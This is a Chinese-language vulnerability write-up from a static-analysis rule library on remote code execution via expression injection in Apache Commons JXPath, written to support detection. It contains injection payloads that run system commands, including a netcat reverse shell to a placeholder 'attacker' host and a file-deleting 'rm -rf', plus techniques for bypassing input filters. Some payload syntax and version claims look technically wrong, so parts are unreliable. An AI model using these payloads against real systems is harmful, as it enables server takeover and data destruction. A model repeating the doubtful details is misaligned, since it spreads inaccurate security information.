# Apache Commons JXPath 远程代码执行漏洞（RCE）完整描述

> 来源：ChanziSAST 规则库语义规则提取（知识整理，含中文漏洞详解）。
> 规则 ID：`pom_jxpath_codei` · 类别：codei · 关键 sink：（cypher 结构提取，见原文）
> 说明：原文为 cypher 语义查询（不可直接挂 semgrep），下方「知识正文」为规则自带的中文漏洞详解，
> 提取时未改写；配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


### Apache Commons JXPath 远程代码执行漏洞（RCE）完整描述
Apache Commons JXPath 是 Apache 基金会旗下的一款用于处理 XML/Java 对象图中 XPath 表达式的开源库，旨在简化 Java 应用中对复杂对象结构的 XPath 解析与操作。该组件的远程代码执行漏洞核心源于**不安全的 XPath 表达式解析与动态代码执行**，其触发场景、原理及影响范围具有多维度特征，以下从核心原理、触发条件、不同攻击场景、影响版本等维度完整阐述：

#### 一、漏洞核心原理
JXPath 允许开发者通过 XPath 表达式查询、操作 Java 对象图（而非仅 XML），其底层实现中存在**对用户可控输入的 XPath 表达式未做严格校验**，且支持通过 XPath 表达式调用 Java 类的静态方法、构造函数甚至执行任意代码。核心风险点包括：
1. **动态类加载与方法调用**：JXPath 解析 XPath 表达式时，支持通过 `java:` 前缀或内置的 `JXPathContext` 机制解析并调用任意 Java 类的方法，若表达式由用户控制，攻击者可构造恶意表达式触发危险方法执行。
2. **表达式注入**：应用若直接将用户输入拼接进 XPath 表达式（而非使用参数化查询），攻击者可注入恶意代码片段，覆盖原有表达式逻辑并执行任意命令。
3. **无权限校验的反射调用**：JXPath 对反射调用的 Java 方法未做权限限制，即使是 `Runtime`、`ProcessBuilder` 等高危类，也可被无差别调用。

#### 二、漏洞触发的前提条件
漏洞能否被利用需满足以下核心条件（缺一不可）：
1. **输入可控**：应用将用户可控的输入（如 HTTP 参数、表单数据、URL 路径、XML/JSON 报文等）直接传入 JXPath 的表达式解析接口（如 `JXPathContext.createContext()`、`jxpathContext.getValue()` 等）。
2. **未做输入过滤/校验**：应用未对传入的 XPath 表达式进行白名单校验、特殊字符转义或危险类/方法拦截。
3. **运行环境权限**：JXPath 运行的 Java 进程具备足够的系统权限（如可执行系统命令、读写文件等），决定了漏洞利用的危害程度。
4. **依赖版本存在缺陷**：使用了存在漏洞的 Apache Commons JXPath 版本（核心受影响版本为 1.3 及之前版本，后续部分版本虽有修复但存在绕过可能）。

#### 三、不同攻击场景与利用方式
根据应用使用 JXPath 的场景不同，漏洞利用形式分为以下几类：

##### 场景1：直接解析用户可控的 XPath 表达式（最典型）
**场景描述**：应用开发时为了灵活查询对象数据，直接将用户输入作为完整的 XPath 表达式传入 JXPath 解析方法。
**示例代码（漏洞代码）**：
```java
import org.apache.commons.jxpath.JXPathContext;

public class JXPathVuln {
    public static void main(String[] args) {
        // 用户可控输入（如从HTTP请求中获取）
        String userInput = args[0];
        // 创建JXPath上下文
        JXPathContext context = JXPathContext.newContext(new Object());
        // 直接解析用户输入的XPath表达式
        Object result = context.getValue(userInput);
        System.out.println(result);
    }
}
```
**攻击利用**：攻击者构造恶意 XPath 表达式，调用 `Runtime.getRuntime().exec()` 执行系统命令，典型恶意表达式示例：
```xpath
java.lang.Runtime.getRuntime().exec('calc.exe')
```
或通过构造函数调用 `ProcessBuilder`：
```xpath
new java.lang.ProcessBuilder(new java.lang.String[]{'cmd','/c','whoami'}).start()
```
**危害**：直接执行任意系统命令，控制服务器。

##### 场景2：表达式拼接导致的注入（间接可控）
**场景描述**：应用未直接接收完整表达式，但将用户输入拼接进 XPath 表达式模板中，导致注入。
**示例代码（漏洞代码）**：
```java
// 用户输入的参数（如从URL获取：?field=name）
String userField = request.getParameter("field");
// 拼接XPath表达式
String xpathExpr = "//user/" + userField;
JXPathContext context = JXPathContext.newContext(userObject);
Object result = context.getValue(xpathExpr);
```
**攻击利用**：攻击者输入恶意片段拼接覆盖原有表达式，例如：
```
userField = "name') | java.lang.Runtime.getRuntime().exec('nc attacker 4444 -e /bin/bash') | ("
```
拼接后的表达式变为：
```xpath
//user/name') | java.lang.Runtime.getRuntime().exec('nc attacker 4444 -e /bin/bash') | (
```
JXPath 解析时会执行管道符 `|` 分隔的恶意表达式，触发命令执行。
**特点**：用户输入仅为表达式片段，需利用 XPath 语法（如管道符、括号）拼接恶意代码，隐蔽性更高。

##### 场景3：XML 解析场景下的 XPath 注入（结合 XML 输入）
**场景描述**：应用使用 JXPath 解析外部传入的 XML 数据，且 XPath 表达式包含用户可控参数，常见于 XML 接口、配置解析等场景。
**示例流程**：
1. 客户端上传 XML 数据：
```xml
<users>
  <user>
    <id>1</id>
    <name>admin</name>
  </user>
</users>
```
2. 应用通过用户输入的 `id` 拼接 XPath 解析 XML：
```java
String userId = request.getParameter("id");
String xpathExpr = "/users/user[id=" + userId + "]/name";
JXPathContext context = JXPathContext.newContext(xmlDocument);
String userName = (String) context.getValue(xpathExpr);
```
**攻击利用**：攻击者构造 `userId` 参数为：
```
1 and java.lang.Runtime.getRuntime().exec('rm -rf /tmp/*')
```
拼接后的表达式：
```xpath
/users/user[id=1 and java.lang.Runtime.getRuntime().exec('rm -rf /tmp/*')]/name
```
JXPath 解析时会先执行 `and` 后的恶意方法，再查询节点，导致命令执行。
**特点**：结合 XML 解析场景，利用 XPath 逻辑运算符（`and`/`or`）注入恶意代码，易被误认为普通 XML 注入，忽视代码执行风险。

##### 场景4：JXPath 扩展函数/自定义函数的滥用
**场景描述**：JXPath 支持自定义扩展函数，若应用未限制扩展函数的调用范围，或自定义函数中存在不安全的代码执行逻辑，攻击者可通过调用扩展函数触发 RCE。
**示例**：应用自定义扩展函数 `execCmd` 用于执行系统命令，并注册到 JXPath 上下文：
```java
JXPathContext context = JXPathContext.newContext(obj);
context.setFunctions(new MyCustomFunctions()); // 包含execCmd函数
String expr = request.getParameter("expr");
context.getValue(expr);
```
**攻击利用**：攻击者直接调用自定义扩展函数：
```xpath
execCmd('whoami')
```
即使原生 JXPath 修复了核心类调用限制，自定义函数的不安全实现仍会导致 RCE。
**特点**：依赖应用自定义扩展函数的实现，属于“二次漏洞”，危害程度取决于自定义函数的权限。

#### 四、影响范围与版本特征
1. **核心受影响版本**：Apache Commons JXPath 1.0 ~ 1.3 版本（官方确认 1.3 及之前存在严重的表达式执行漏洞）。
2. **版本修复差异**：
   - 1.4 版本虽修复了部分直接调用 `Runtime` 类的场景，但仍存在通过 `Class.forName` 反射调用的绕过方式；
   - 后续版本（如 2.0+）虽加强了权限校验，但在自定义上下文、扩展函数场景下仍可能存在绕过。
3. **跨环境影响**：
   - 运行环境：所有基于 JVM 的环境（Java SE/EE、Android 等），只要依赖存在漏洞的 JXPath 版本；
   - 应用类型：使用 JXPath 处理动态输入的 Web 应用（如 Spring、Struts 项目）、桌面应用、中间件等。

#### 五、漏洞利用的绕过方式（补充）
即使应用做了基础过滤（如拦截 `Runtime` 类），攻击者仍可通过以下方式绕过：
1. **反射调用**：通过 `Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(...)` 绕过直接类名过滤；
2. **替代类调用**：使用 `ProcessBuilder`、`java.lang.Process`、`java.lang.Thread` 等替代 `Runtime` 执行命令；
3. **编码绕过**：将命令字符串进行 Base64 编码，再通过 `new String(Base64.getDecoder().decode("Y2FsYy5leGU="))` 还原，绕过字符过滤；
4. **多级调用**：通过嵌套表达式（如 `java.lang.System.getProperties().put("cmd", "whoami")` + 后续读取执行）绕过单次表达式检测。

#### 六、漏洞危害的分级
根据场景不同，危害程度分为：
1. **高危（直接表达式可控）**：可直接执行任意命令，完全控制服务器；
2. **中危（拼接注入/XML场景）**：需构造特定语法，依赖 XPath 解析逻辑，仍可执行命令；
3. **低危（有限权限/过滤场景）**：仅能执行有限命令（如读取文件），或触发异常但无法执行代码。

综上，Apache Commons JXPath 远程代码执行漏洞的核心是“用户可控输入 → 无校验的 XPath 解析 → 任意 Java 方法/系统命令执行”，其利用场景覆盖直接输入、拼接注入、XML 解析、自定义函数等多类场景，且存在多种绕过方式，是 Java 应用中典型的“表达式注入型 RCE”漏洞。

